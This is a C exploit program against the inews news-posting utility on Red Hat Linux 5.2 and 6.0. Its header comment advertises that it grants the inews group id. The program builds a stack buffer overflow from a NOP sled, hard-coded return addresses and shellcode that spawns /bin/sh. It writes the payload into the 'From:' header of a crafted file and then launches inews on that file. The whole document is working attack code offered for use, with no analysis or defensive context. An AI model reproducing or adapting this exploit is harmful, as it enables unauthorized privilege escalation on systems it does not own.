/* inews exploit , gives you the inews egid .
* bawd@kitetoa.com
* greetz to nitro,shivan,rfp & Minus :)
*
*
* RET addresses change between RH 5.2 ,6.0 etc..
*
* RH 5.2 RET = 0xbffff6f0
* RH 6.0 RET = 0xbffff6e0 :> pretty hard to guess huhuhu..
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#define DEFAULT_OFFSET 0
#define BUFFER_SIZE 540
#define RET 0xbffff6f0



main (int argc, char *argv[])
{
FILE *fp;
int offset = 0;
char *buff = NULL;
int i;

u_char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
"\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
"\xd7\xff\xff\xff/bin/sh";



if (argc > 1)
offset = atoi (argv[1]);

buff = malloc (1024);

if (!buff)
{
printf ("malloc isnt working\n");
exit (0);
}

memset (buff, 0x90, BUFFER_SIZE);

for (i = 100; i < BUFFER_SIZE - 4; i += 4)
*(long *) &buff[i] = RET + offset;

memcpy (buff + (100 - strlen (execshell)), execshell, strlen (execshell));

if ((fp = fopen ("filez", "w")) != NULL)
{
  fprintf (fp, "From: %s\nSubject: y0\nNewsgroups: yaya le chat\n\n\n\n\n", 
buff);
  fclose (fp);
  execl ("/usr/bin/inews", "inews", "-h", "filez", NULL);
  }

else {
     printf ("Couldnt open file : filez\n");
     exit (0);
     }

}